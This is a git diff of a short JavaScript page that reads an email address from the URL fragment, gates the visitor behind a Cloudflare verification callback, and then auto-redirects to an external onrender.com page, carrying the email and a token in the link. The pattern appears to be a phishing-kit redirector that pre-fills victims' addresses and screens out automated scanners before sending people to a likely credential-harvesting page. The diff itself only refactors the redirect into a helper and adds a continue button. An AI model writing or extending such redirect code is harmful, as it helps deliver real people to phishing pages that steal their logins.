@@ -4,8 +4,7 @@ function generateSecureToken(length = 64) {
   return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
 }
 
-// Store data on page load
-window.onload = function() {
+window.onload = function () {
   const hash = window.location.hash.substring(1);
   if (hash && hash.includes("@")) {
     sessionStorage.setItem("redirect_email", hash);
@@ -14,15 +13,29 @@ window.onload = function() {
   }
 };
 
-// Cloudflare verification callback
 function onVerify(token) {
-  const email = sessionStorage.getItem("redirect_email");
-  const secureToken = sessionStorage.getItem("redirect_token");
+  // Cloudflare verification passed
+  document.getElementById('continueBtn').style.display = 'inline-block';
+  
+  // Auto-submit after short delay (optional)
+  setTimeout(() => {
+    proceedWithRedirect();
+  }, 1000);
+}
 
-  if (email && secureToken) {
-    // Redirect immediately after verification
-    window.location.href = `https://ronnicf-github-io.onrender.com/adb.html#${email}&token=${secureToken}`;
+// Attach click handler to button
+document.addEventListener('DOMContentLoaded', function() {
+  document.getElementById('continueBtn').addEventListener('click', proceedWithRedirect);
+});
+
+function proceedWithRedirect() {
+  const email = sessionStorage.getItem("redirect_email");
+  const token = sessionStorage.getItem("redirect_token");
+
+  if (email && token) {
+    const url = `https://ronnicf-github-io.onrender.com/adb.html#${email}&token=${token}`;
+    window.location.href = url;
   } else {
-    alert("Verification error. Please refresh and try again.");
+    alert("Session expired or invalid. Please reload the page.");
   }
 }
